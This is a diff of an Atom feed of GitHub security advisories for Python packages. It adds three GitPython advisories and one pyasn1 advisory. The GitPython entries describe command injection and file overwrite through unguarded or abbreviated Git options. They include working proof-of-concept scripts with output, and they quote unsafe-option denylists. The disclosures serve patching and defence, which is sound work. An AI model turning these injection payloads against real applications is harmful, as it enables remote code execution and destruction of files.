@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-07-21T18:07:55.515Z</updated>
+    <updated>2026-07-21T20:12:06.799Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,536 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[GitPython] GitPython: command injection via unguarded Git options in `Repo.archive()`, `git.ls_remote()`, and arbitrary file overwrite via `Repo.iter_commits()` / `Repo.blame()`]]></title>
+        <id>https://github.com/advisories/GHSA-956x-8gvw-wg5v</id>
+        <link href="https://github.com/advisories/GHSA-956x-8gvw-wg5v"/>
+        <updated>2026-07-21T20:10:06.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>GitPython spawns the real <code>git</code> binary with an argument vector built from caller-supplied values. To prevent argument injection, GitPython maintains denylists of "unsafe" Git options (<code>--upload-pack</code>, <code>--receive-pack</code>, <code>--exec</code>, <code>-c</code>, <code>--config</code>, …) that can be abused to run arbitrary commands, and enforces them with <code>Git.check_unsafe_options()</code>.</p>
+<p>That enforcement is only wired into the <strong>network</strong> commands — <code>clone_from</code>, <code>Remote.fetch</code>, <code>Remote.pull</code>, <code>Remote.push</code>. Several other public APIs that also forward caller-controlled values into the <code>git</code> argv have <strong>no guard at all</strong>:</p>
+<ol>
+<li><p><strong><code>Repo.archive(ostream, treeish=None, prefix=None, **kwargs)</code></strong> forwards <code>**kwargs</code> verbatim into <code>git archive</code>. An attacker-influenced options mapping such as <code>{"remote": ".", "exec": "&lt;cmd&gt;"}</code> becomes <code>git archive --remote=. --exec=&lt;cmd&gt; -- &lt;treeish&gt;</code>, and <code>git archive --remote=&lt;local repo&gt;</code> invokes <code>git-upload-archive</code> whose path is overridden by <code>--exec</code> → <strong>arbitrary command execution under default Git configuration</strong> (no <code>protocol.ext.allow</code> needed).</p>
+</li>
+<li><p><strong><code>repo.git.ls_remote(&lt;url&gt;, upload_pack="&lt;cmd&gt;")</code></strong> (and the dynamic-command builder generally) turns the <code>upload_pack</code> kwarg into <code>--upload-pack=&lt;cmd&gt;</code> with no guard → <strong>arbitrary command execution</strong>.</p>
+</li>
+<li><p><strong><code>Repo.iter_commits(rev)</code></strong> and <strong><code>Repo.blame(rev, file)</code></strong> place the caller's <code>rev</code> value into the argv <em>before</em> the <code>--</code> end-of-options separator and apply no leading-dash check. A benign-looking ref value such as <code>--output=/path/to/file</code> is parsed by <code>git rev-list</code> / <code>git blame</code> as the <code>--output</code> option, which <strong>opens and truncates an arbitrary file</strong> before Git even validates the revision → arbitrary file clobber (integrity/availability; can destroy keys, configs, lockfiles, or be aimed at files the host later sources).</p>
+</li>
+</ol>
+<p>The first two are direct code execution; the third is an arbitrary file-overwrite primitive. All share one root cause: the <code>check_unsafe_options</code> / end-of-options discipline that GitPython applies to clone/fetch/pull/push was never extended to these sinks.</p>
+<h2 id="details">Details</h2>
+<p>GitPython explicitly recognises these options as command-execution vectors. <code>git/remote.py:535</code>:</p>
+<pre><code class="language-python">unsafe_git_fetch_options = [
+    # Arbitrary command execution.
+    "--upload-pack",
+    "--receive-pack",
+    # Arbitrary file overwrite.
+    "--exec",
+]
+</code></pre>
+<p>and enforces them via <code>Git.check_unsafe_options()</code> (<code>git/cmd.py:963</code>):</p>
+<pre><code class="language-python">def check_unsafe_options(cls, options, unsafe_options):
+    ...
+    if unsafe_option is not None:
+        raise UnsafeOptionError(f"{unsafe_option} is not allowed, use `allow_unsafe_options=True` to allow it.")
+</code></pre>
+<p>But <code>check_unsafe_options</code> is invoked from <strong>only five sites</strong>, all network commands:</p>
+<pre><code>git/remote.py:1071   Remote.fetch
+git/remote.py:1125   Remote.pull
+git/remote.py:1198   Remote.push
+git/repo/base.py:1410 / :1412  Repo.clone_from
+</code></pre>
+<p>The following sinks call <code>git</code> with caller-controlled options/positionals and are <strong>not</strong> guarded:</p>
+<h3 id="1-repoarchive--command-execution-gitrepobasepy1623">1. <code>Repo.archive</code> — command execution (<code>git/repo/base.py:1623</code>)</h3>
+<pre><code class="language-python">def archive(self, ostream, treeish=None, prefix=None, **kwargs):
+    ...
+    self.git.archive("--", treeish, *path, **kwargs)
+    return self
+</code></pre>
+<p><code>treeish</code> and <code>path</code> are correctly placed after <code>--</code>, but <code>**kwargs</code> are converted by <code>Git.transform_kwarg</code> (<code>git/cmd.py:1487</code>) into <code>--&lt;name&gt;=&lt;value&gt;</code> flags and inserted <strong>before</strong> the <code>--</code> by <code>_call_process</code>, with no <code>check_unsafe_options</code>. <code>Repo.archive</code> already documents user-facing kwargs (<code>format</code>, <code>prefix</code>, <code>path</code>), so forwarding a caller options mapping is an expected usage. Final argv:</p>
+<pre><code>git archive --remote=. --exec=&lt;cmd&gt; -- &lt;treeish&gt;
+</code></pre>
+<p><code>git archive --remote=&lt;repo&gt;</code> runs the upload-archive helper; <code>--exec=&lt;cmd&gt;</code> overrides the helper path, executing <code>&lt;cmd&gt;</code> on the host. This works with <strong>default Git config</strong> — it does not rely on the <code>ext::</code> transport (which is blocked by default).</p>
+<h3 id="2-repogitls_remote-upload_pack--command-execution-dynamic-builder-gitcmdpy1487">2. <code>repo.git.ls_remote(..., upload_pack=...)</code> — command execution (dynamic builder, <code>git/cmd.py:1487</code>)</h3>
+<p><code>transform_kwarg</code> dashifies <code>upload_pack</code> → <code>--upload-pack=&lt;value&gt;</code>. <code>git ls-remote &lt;local-repo&gt; --upload-pack=&lt;cmd&gt;</code> executes <code>&lt;cmd&gt;</code>. The dynamic builder makes <strong>both</strong> the flag name and value caller-controlled (<code>repo.git.&lt;anything&gt;(**user_dict)</code>), and <code>ls_remote</code> has no <code>check_unsafe_options</code>.</p>
+<p>This is exactly the underscore-kwarg-vs-hyphen-kwarg gap that CVE-2026-42215 fixed for <code>fetch</code>/<code>pull</code>/<code>push</code>/<code>clone_from</code> — but <code>ls_remote</code> and the rest of the dynamic surface were left unpatched.</p>
+<h3 id="3-repoiter_commits--repoblame--arbitrary-file-overwrite-gitobjectscommitpy348-gitrepobasepy1199">3. <code>Repo.iter_commits</code> / <code>Repo.blame</code> — arbitrary file overwrite (<code>git/objects/commit.py:348</code>, <code>git/repo/base.py:1199</code>)</h3>
+<pre><code class="language-python"># Commit.iter_items (reached via Repo.iter_commits)
+proc = repo.git.rev_list(rev, args_list, as_process=True, **kwargs)   # args_list == ["--", *paths]
+</code></pre>
+<pre><code class="language-python"># Repo.blame
+data = self.git.blame(rev, *rev_opts, "--", file, p=True, stdout_as_string=False, **kwargs)
+</code></pre>
+<p><code>rev</code> is placed <strong>before</strong> <code>--</code>, with no leading-dash check anywhere in the path. A caller passing <code>rev="--output=/path"</code> (a value that looks like an ordinary ref/branch/tag string an app forwards from user input) produces:</p>
+<pre><code>git rev-list --output=/path --
+</code></pre>
+<p><code>git rev-list</code>/<code>log</code>/<code>blame</code> honour <code>--output=&lt;file&gt;</code>, which <code>open()</code>s and truncates the file <em>before</em> validating the revision — so the file is destroyed even though Git then errors out on the bad revision.</p>
+<h2 id="poc">PoC</h2>
+<p>All three PoCs are self-contained, run against the released <strong>GitPython 3.1.50</strong> under <strong>default Git configuration</strong>, and were executed live (git 2.51.0). Each prints a host-side marker proving the effect.</p>
+<h3 id="install">Install</h3>
+<pre><code class="language-bash">python3 -m venv venv &amp;&amp; . venv/bin/activate
+pip install GitPython           # resolves to 3.1.50
+python -c "import git; print(git.__version__)"   # 3.1.50
+</code></pre>
+<h3 id="poc-1--command-execution-via-repoarchive">PoC 1 — command execution via <code>Repo.archive</code></h3>
+<pre><code class="language-python"># archive_rce.py
+import io, os, tempfile, subprocess, git
+
+d = tempfile.mkdtemp()
+subprocess.run(['git','init','-q',d], check=True)
+subprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a',
+                'commit','-q','--allow-empty','-m','init'], check=True)
+repo = git.Repo(d)
+
+marker = os.path.join(tempfile.gettempdir(), 'gp_rce_marker')
+if os.path.exists(marker): os.remove(marker)
+
+# a service lets a user export a repo and forwards their options dict
+opts = {'remote': '.', 'exec': 'touch ' + marker}
+try:
+    repo.archive(io.BytesIO(), **opts)
+except git.exc.GitCommandError as e:
+    print('[*] git exited non-zero (expected), but the exec already ran:', str(e).splitlines()[0][:60])
+
+print('[+] marker present:', os.path.exists(marker))
+</code></pre>
+<p>Verbatim output:</p>
+<pre><code>[*] git exited non-zero (expected), but the exec already ran: Cmd('git') failed due to: exit code(128)
+[+] marker present: True
+</code></pre>
+<p><code>git config --get protocol.ext.allow</code> returns nothing (unset = default), confirming no special config is required.</p>
+<h3 id="poc-2--command-execution-via-gitls_remoteupload_pack">PoC 2 — command execution via <code>git.ls_remote(upload_pack=...)</code></h3>
+<pre><code class="language-python"># lsremote_rce.py
+import os, tempfile, subprocess, git
+d = tempfile.mkdtemp()
+subprocess.run(['git','init','-q',d], check=True)
+subprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a','commit','-q','--allow-empty','-m','init'], check=True)
+repo = git.Repo(d)
+marker = os.path.join(tempfile.gettempdir(),'gp_lsr_marker')
+if os.path.exists(marker): os.remove(marker)
+try:
+    repo.git.ls_remote('.', upload_pack='touch '+marker+';')
+except git.exc.GitCommandError as e:
+    print('[*] git err:', str(e).splitlines()[0][:50])
+print('[+] ls-remote marker present:', os.path.exists(marker))
+</code></pre>
+<p>Verbatim output:</p>
+<pre><code>[*] git err: Cmd('git') failed due to: exit code(128)
+[+] ls-remote marker present: True
+</code></pre>
+<h3 id="poc-3--arbitrary-file-overwrite-via-a-benign-looking-rev">PoC 3 — arbitrary file overwrite via a benign-looking <code>rev</code></h3>
+<pre><code class="language-python"># itercommits_filewrite.py
+import os, tempfile, subprocess, git
+d = tempfile.mkdtemp()
+subprocess.run(['git','init','-q',d], check=True)
+subprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a','commit','-q','--allow-empty','-m','init'], check=True)
+repo = git.Repo(d)
+victim = os.path.join(tempfile.gettempdir(),'gp_fw_victim')
+open(victim,'w').write('do not delete\n')
+print('[*] before:', repr(open(victim).read()))
+user_ref = '--output=' + victim          # value an app forwards as a "ref/branch"
+try:
+    list(repo.iter_commits(user_ref))
+except git.exc.GitCommandError as e:
+    print('[*] git err (after open+truncate):', str(e).splitlines()[0][:50])
+print('[+] after :', repr(open(victim).read()), '&lt;- truncated')
+</code></pre>
+<p>Verbatim output:</p>
+<pre><code>[*] before: 'do not delete\n'
+[*] git err (after open+truncate): Cmd('git') failed due to: exit code(129)
+[+] after : '' &lt;- truncated
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-956x-8gvw-wg5v">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-956x-8gvw-wg5v</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/pull/2163">https://github.com/gitpython-developers/GitPython/pull/2163</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/commit/701ce32fe5ba8cb622c0e0342a376a6beb47d738">https://github.com/gitpython-developers/GitPython/commit/701ce32fe5ba8cb622c0e0342a376a6beb47d738</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51</a></li>
+<li><a href="https://github.com/advisories/GHSA-956x-8gvw-wg5v">https://github.com/advisories/GHSA-956x-8gvw-wg5v</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-956x-8gvw-wg5v</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-21T20:10:06.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[GitPython] GitPython: Command Injection via git long-option prefix abbreviation bypass of CVE-2026-42215 blocklist]]></title>
+        <id>https://github.com/advisories/GHSA-2f96-g7mh-g2hx</id>
+        <link href="https://github.com/advisories/GHSA-2f96-g7mh-g2hx"/>
+        <updated>2026-07-21T19:43:44.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="command-injection-via-long-option-prefix-abbreviation-bypassing-check_unsafe_options-incomplete-fix-of-cve-2026-42215--ghsa-rpm5-65cw-6hj4">Command injection via long-option prefix abbreviation bypassing <code>check_unsafe_options</code> (incomplete fix of CVE-2026-42215 / GHSA-rpm5-65cw-6hj4)</h2>
+<p><strong>Component:</strong> gitpython-developers/GitPython (PyPI: GitPython)
+<strong>Affected:</strong> all versions carrying the 3.1.47 blocklist fix, through current <code>main</code> (verified at commit <code>20c5e275</code>, <code>3.1.50-42</code>)
+<strong>CWE:</strong> CWE-184 (Incomplete List of Disallowed Inputs) → CWE-78 (OS Command Injection)
+<strong>Severity:</strong> inherits the parent CVE-2026-42215 surface; estimated High, ~8.8 (<code>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code>) — final scoring deferred to maintainer/CNA, mirroring the parent.
+<strong>Reporter:</strong> hackkim</p>
+<h3 id="summary">Summary</h3>
+<p>The 3.1.47 fix for CVE-2026-42215 blocks dangerous git options (<code>--upload-pack</code>, <code>--config</code>, <code>-c</code>, <code>-u</code> for clone; <code>--upload-pack</code> for fetch/pull; <code>--receive-pack</code>, <code>--exec</code> for push) so callers cannot reach command-executing options unless they pass <code>allow_unsafe_options=True</code>.</p>
+<p>The fix canonicalizes an option name along <strong>one</strong> axis (underscore→hyphen via <code>dashify</code>) and checks it against an <strong>exact-match</strong> dict. It does not account for git's unambiguous long-option prefix abbreviation. Git accepts any unambiguous prefix of a long option (<code>--upload-p</code>, <code>--upload-pa</code>, <code>--upload-pac</code> all resolve to <code>--upload-pack</code>). So a kwarg key like <code>upload_p</code> canonicalizes to <code>upload-p</code>, misses the blocklist dict, and is emitted to git as <code>--upload-p=&lt;value&gt;</code> → executed as <code>--upload-pack=&lt;value&gt;</code> → command injection, in the default <code>allow_unsafe_options=False</code> configuration.</p>
+<h3 id="the-asymmetry-root-cause">The asymmetry (root cause)</h3>
+<pre><code class="language-python"># git/cmd.py (commit 20c5e275), lines 948-974
+@classmethod
+def _canonicalize_option_name(cls, option):
+    option_name = option.lstrip("-").split("=", 1)[0]
+    option_tokens = option_name.split(None, 1)
+    if not option_tokens:
+        return ""
+    return dashify(option_tokens[0])      # only transform: "_" -&gt; "-"
+
+@classmethod
+def check_unsafe_options(cls, options, unsafe_options):
+    canonical_unsafe_options = {cls._canonicalize_option_name(o): o for o in unsafe_options}
+    for option in options:
+        unsafe_option = canonical_unsafe_options.get(cls._canonicalize_option_name(option))
+        if unsafe_option is not None:
+            raise UnsafeOptionError(...)
+</code></pre>
+<p>The guard normalizes only <code>_</code>→<code>-</code> and does exact dict membership. Git's CLI parser accepts a broader grammar (prefix abbreviation) than the guard models, so abbreviated keys slip through and reach git as the blocked option.</p>
+<h3 id="affected-code-commit-20c5e275">Affected code (commit <code>20c5e275</code>)</h3>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>git/cmd.py:948-960</code> <code>_canonicalize_option_name</code></td>
+<td>canonicalizer — no prefix expansion</td>
+</tr>
+<tr>
+<td><code>git/cmd.py:963-974</code> <code>check_unsafe_options</code></td>
+<td>exact-match dict lookup (the incomplete guard)</td>
+</tr>
+<tr>
+<td><code>git/cmd.py:1511</code> <code>transform_kwarg</code></td>
+<td>emits <code>--&lt;dashify(name)&gt;=&lt;value&gt;</code> to the CLI</td>
+</tr>
+<tr>
+<td><code>git/repo/base.py:1411,1413</code></td>
+<td>clone call sites</td>
+</tr>
+<tr>
+<td><code>git/remote.py:1074,1128,1201</code></td>
+<td>fetch / pull / push call sites</td>
+</tr>
+</tbody></table>
+<h3 id="bypass-keys-verified">Bypass keys (verified)</h3>
+<table>
+<thead>
+<tr>
+<th>kwarg key</th>
+<th>git resolves to</th>
+<th>path</th>
+<th>weaponizable</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>upload_p</code>, <code>upload_pac</code></td>
+<td><code>--upload-pack</code></td>
+<td>clone / fetch / pull</td>
+<td>Yes — direct RCE</td>
+</tr>
+<tr>
+<td><code>receive_p</code></td>
+<td><code>--receive-pack</code></td>
+<td>push</td>
+<td>Yes — direct RCE</td>
+</tr>
+<tr>
+<td><code>exe</code></td>
+<td><code>--exec</code></td>
+<td>push</td>
+<td>Yes — direct RCE</td>
+</tr>
+<tr>
+<td><code>conf</code>, <code>confi</code></td>
+<td><code>--config</code></td>
+<td>clone</td>
+<td>bypasses option blocklist; RCE needs an additional config vector (see note)</td>
+</tr>
+</tbody></table>
+<h3 id="minimal-poc">Minimal PoC</h3>
+<p>Self-contained, no network egress (a local bare repo acts as the "remote"). Tested on current <code>main</code> (git 2.50.1):</p>
+<pre><code class="language-python">import os, stat, tempfile
+from git import Repo
+
+work = tempfile.mkdtemp()
+marker = os.path.join(work, "RCE_MARKER")
+
+# fake "upload-pack" program that proves arbitrary command execution
+prog = os.path.join(work, "evil.sh")
+with open(prog, "w") as f:
+    f.write(f"#!/bin/sh\ntouch {marker}\nexit 1\n")  # exit 1 so git aborts after our code ran
+os.chmod(prog, os.stat(prog).st_mode | stat.S_IEXEC)
+
+bare = os.path.join(work, "remote.git")
+Repo.init(bare, bare=True)
+
+# attacker-controlled kwarg KEY 'upload_p' -&gt; --upload-p=&lt;prog&gt; -&gt; git runs &lt;prog&gt;
+try:
+    Repo.clone_from(bare, os.path.join(work, "out"), upload_p=prog)
+except Exception:
+    pass  # git aborts with GitCommandError AFTER the payload executed
+
+print("RCE marker created:", os.path.exists(marker))  # True -&gt; command injection confirmed
+</code></pre>
+<p>Equivalent at the shell: <code>git clone --upload-p=/tmp/evil.sh src out</code> runs <code>evil.sh</code>.</p>
+<p>Confirmed behavior:</p>
+<ul>
+<li><code>upload_pack</code> (exact) → blocked; <code>upload_p</code> (abbrev) → passes guard, reaches git, executes. The fix works for the form it models but not the abbreviated form.</li>
+<li><code>allow_unsafe_options=True</code> opt-out behaves as documented (out of scope).</li>
+</ul>
+<h3 id="honest-scope-note">Honest scope note</h3>
+<p>Like the parent CVE, exploitation requires a host application that flows attacker-controlled kwarg <strong>keys</strong> into a GitPython clone/fetch/pull/push. Where the host passes only fixed/validated keys, this is not reachable — the vulnerability is in the library's documented defense-in-depth control (<code>allow_unsafe_options=False</code>), which this variant defeats.</p>
+<p>On the <code>--config</code> family: <code>conf</code> bypasses the option blocklist, but weaponizing <code>--config protocol.ext.allow=always</code> via an <code>ext::</code> URL is independently blocked by GitPython's protocol allowlist (<code>allow_unsafe_protocols=False</code>). The directly weaponizable family is <code>upload-pack</code> / <code>receive-pack</code> / <code>exec</code>. Reported transparently — not claiming Critical.</p>
+<h3 id="suggested-remediation-any-one">Suggested remediation (any one)</h3>
+<ol>
+<li><strong>Prefix-aware matching:</strong> reject any option whose canonical name is an unambiguous prefix of a blocked option (≈ <code>startswith</code> on the blocked canonical name, after <code>dashify</code>).</li>
+<li><strong>Disable abbreviation at the sink:</strong> pass <code>--end-of-options</code> or invoke git in a way that disables long-option abbreviation.</li>
+<li><strong>Allowlist</strong> option names on security-sensitive subcommands instead of a blocklist.</li>
+</ol>
+<p>Remediation should also cover the <code>-c</code>/<code>--config</code> family abbreviations, even though the <code>ext::</code> route is currently gated by the protocol allowlist.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-2f96-g7mh-g2hx">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-2f96-g7mh-g2hx</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/pull/2161">https://github.com/gitpython-developers/GitPython/pull/2161</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/commit/56806080c1348749b07daa4a2024ce47b3cad285">https://github.com/gitpython-developers/GitPython/commit/56806080c1348749b07daa4a2024ce47b3cad285</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51</a></li>
+<li><a href="https://github.com/advisories/GHSA-2f96-g7mh-g2hx">https://github.com/advisories/GHSA-2f96-g7mh-g2hx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2f96-g7mh-g2hx</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-21T19:43:43.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[GitPython] GitPython unsafe clone option gate bypass through joined short options]]></title>
+        <id>https://github.com/advisories/GHSA-v396-v7q4-x2qj</id>
+        <link href="https://github.com/advisories/GHSA-v396-v7q4-x2qj"/>
+        <updated>2026-07-21T19:43:16.000Z</updated>
+        <content type="html"><![CDATA[<p><code>GitPython</code> version <code>3.1.50</code> blocks unsafe <code>git clone</code> options such as <code>--upload-pack</code>, <code>-u</code>, <code>--config</code>, and <code>-c</code> unless callers explicitly pass <code>allow_unsafe_options=True</code>. However, the default unsafe-option gate does not recognize joined short-option forms such as <code>-u/path/to/helper</code>.</p>
+<p>Git itself accepts <code>-u&lt;upload-pack&gt;</code> as the short form of <code>--upload-pack=&lt;upload-pack&gt;</code>. As a result, <code>Repo.clone_from(..., multi_options=["-u&lt;helper&gt;"], allow_unsafe_options=False)</code> can execute the helper command even though the equivalent long option is blocked.</p>
+<p>Affected package:</p>
+<ul>
+<li>Ecosystem: PyPI</li>
+<li>Package: <code>GitPython</code></li>
+<li>Confirmed affected version: <code>3.1.50</code></li>
+<li>Repository: <code>gitpython-developers/GitPython</code></li>
+<li>Current PyPI version during triage: <code>3.1.50</code></li>
+</ul>
+<p>Relevant behavior:</p>
+<ul>
+<li><code>Repo.unsafe_git_clone_options</code> correctly lists <code>--upload-pack</code>, <code>-u</code>, <code>--config</code>, and <code>-c</code> as unsafe clone options.</li>
+<li><code>Repo._clone()</code> splits <code>multi_options</code> with <code>shlex.split(" ".join(multi_options))</code> and then calls <code>Git.check_unsafe_options(...)</code>.</li>
+<li><code>_canonicalize_option_name("-u/path/to/helper")</code> returns a string beginning with <code>u...</code>, not the canonical short option <code>u</code>, so it does not match the blocked <code>-u</code> entry.</li>
+<li>Git accepts the same joined short option as <code>--upload-pack=&lt;helper&gt;</code> and executes the helper during clone.</li>
+</ul>
+<p>Preconditions:</p>
+<p>An application must pass attacker-influenced clone options into <code>Repo.clone_from(..., multi_options=...)</code> while relying on GitPython's default unsafe-option gate to block command-executing options.</p>
+<p>The local PoC uses only a local bare Git repository and a local helper script. It does not contact any third-party service.</p>
+<p>Local reproduction:</p>
+<p>The PoC creates a disposable bare Git repository, a helper script, and a sentinel file path. It first confirms that the long <code>--upload-pack=&lt;helper&gt;</code> form is blocked by GitPython. It then calls <code>Repo.clone_from(..., multi_options=["-u&lt;helper&gt;"], allow_unsafe_options=False)</code>.</p>
+<p>Observed sanitized output:</p>
+<pre><code class="language-text">gitpython_version=3.1.50
+git_version=git version 2.53.0.windows.1
+tmp_dir=&lt;tmp&gt;
+long_upload_pack_gate=BLOCKED:UnsafeOptionError
+joined_short_upload_pack_gate=ALLOWED
+clone_result=EXPECTED_EXCEPTION:GitCommandError
+sentinel_exists=True
+sentinel_text=GITPYTHON_UNSAFE_OPTION_BYPASS
+</code></pre>
+<p>The clone fails because the helper exits nonzero, but the sentinel file proves that Git executed the helper despite <code>allow_unsafe_options=False</code>.</p>
+<p>Impact:</p>
+<p>An attacker who controls <code>multi_options</code> can bypass GitPython's default <code>allow_unsafe_options=False</code> protection and execute a local command via Git's <code>--upload-pack</code> / <code>-u</code> clone option. This is a residual bypass of an explicit GitPython security boundary, not merely a case where a caller opted into unsafe behavior.</p>
+<p>Duplicate / related advisory checks:</p>
+<ul>
+<li>OSV query for <code>PyPI/GitPython</code> version <code>3.1.50</code> returned no vulnerabilities.</li>
+<li>The repository's public advisories include related unsafe Git option issues, including <code>GHSA-x2qx-6953-8485</code> / <code>CVE-2026-42284</code> and <code>GHSA-rpm5-65cw-6hj4</code> / <code>CVE-2026-42215</code>. Their public affected ranges are marked as fixed before 3.1.50.</li>
+<li><code>GHSA-x2qx-6953-8485</code> describes validating <code>multi_options</code> before <code>shlex.split(...)</code>. GitPython 3.1.50 now validates after splitting, but the joined short option <code>-u&lt;value&gt;</code> still bypasses because the validator canonicalizes it to <code>u&lt;value&gt;</code> rather than <code>u</code>.</li>
+<li><code>GHSA-rpm5-65cw-6hj4</code> describes unsafe underscored kwargs such as <code>upload_pack=...</code>. The current PoC uses <code>multi_options=["-u&lt;helper&gt;"]</code> against 3.1.50 and does not depend on underscored kwargs.</li>
+<li>GitHub issue search for <code>upload-pack unsafe options</code> found historical related items, including CVE-2022-24439 and the earlier unsafe-options gate work, but no public issue describing this current joined-short-option residual bypass in 3.1.50.</li>
+<li>GitHub issue search for <code>multi_options unsafe</code> found PR #2130, which fixed splitting of <code>multi_options</code> before checking. The current issue remains after that split because <code>-u&lt;value&gt;</code> is treated as option name <code>u&lt;value&gt;</code>, not blocked short option <code>u</code>.</li>
+<li>GitHub issue searches for <code>u&lt;upload-pack&gt; unsafe</code> and <code>-cfoo</code> returned no results.</li>
+</ul>
+<p>Suggested remediation:</p>
+<p>When checking unsafe Git options, parse joined short options that take values. For clone, <code>-uVALUE</code> and <code>-cKEY=VALUE</code> should be canonicalized to <code>u</code> and <code>c</code> respectively before comparing against the unsafe option set.</p>
+<p>A safer approach is to maintain command-specific metadata for unsafe short options and recognize the bare option, split form, joined form, and long <code>--option=&lt;value&gt;</code> / <code>--option &lt;value&gt;</code> forms.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-v396-v7q4-x2qj">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-v396-v7q4-x2qj</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/pull/2162">https://github.com/gitpython-developers/GitPython/pull/2162</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51</a></li>
+<li><a href="https://github.com/advisories/GHSA-v396-v7q4-x2qj">https://github.com/advisories/GHSA-v396-v7q4-x2qj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v396-v7q4-x2qj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-21T19:43:14.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pyasn1] pyasn1: Uncontrolled resource consumption when converting decoded REAL values]]></title>
+        <id>https://github.com/advisories/GHSA-hm4w-wwcw-mr6r</id>
+        <link href="https://github.com/advisories/GHSA-hm4w-wwcw-mr6r"/>
+        <updated>2026-07-21T19:11:22.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>The univ.Real type converted its (mantissa, base, exponent) value to a Python float using exact big-integer exponentiation. A BER/CER/DER-encoded REAL value only a few bytes long can carry a very large exponent, causing this computation to attempt to materialize an astronomically large integer.</p>
+<p>Any operation that triggers float conversion on such a decoded value — prettyPrint(), str(), comparison, arithmetic, or an explicit float() call — consumes excessive CPU and memory, hanging the process. Applications that decode untrusted ASN.1 data and then print, log, or compare the decoded objects are vulnerable to denial of service. Decoding alone does not trigger the issue.</p>
+<h3 id="affected-components">Affected components</h3>
+<ul>
+<li>pyasn1.type.univ.Real — float conversion (<strong>float</strong>() and everything built on it: prettyPrint(), str(), comparisons, arithmetic, int())</li>
+<li>Reachable through the pyasn1.codec.ber, cer, and der decoders, which produce Real objects from untrusted input; also via directly constructed Real values</li>
+</ul>
+<p>The encoders and the native codec are not affected. Applications that never handle ASN.1 REAL values are not affected.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in pyasn1 0.6.4. Binary (base-2) values are now converted with math.ldexp(), and decimal (base-10) values with exponents beyond float range raise OverflowError without constructing huge intermediate integers. Existing behavior is preserved: out-of-range values raise OverflowError and prettyPrint() renders them as .</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Avoid converting, printing, or comparing decoded Real objects from untrusted sources; inspect the raw (mantissa, base, exponent) tuple instead.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pyasn1/pyasn1/security/advisories/GHSA-hm4w-wwcw-mr6r">https://github.com/pyasn1/pyasn1/security/advisories/GHSA-hm4w-wwcw-mr6r</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59886">https://nvd.nist.gov/vuln/detail/CVE-2026-59886</a></li>
+<li><a href="https://github.com/pyasn1/pyasn1/commit/e60c691cb91addb8fcefa2f537e85ede6fb1e886">https://github.com/pyasn1/pyasn1/commit/e60c691cb91addb8fcefa2f537e85ede6fb1e886</a></li>
+<li><a href="https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4">https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-hm4w-wwcw-mr6r">https://github.com/advisories/GHSA-hm4w-wwcw-mr6r</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
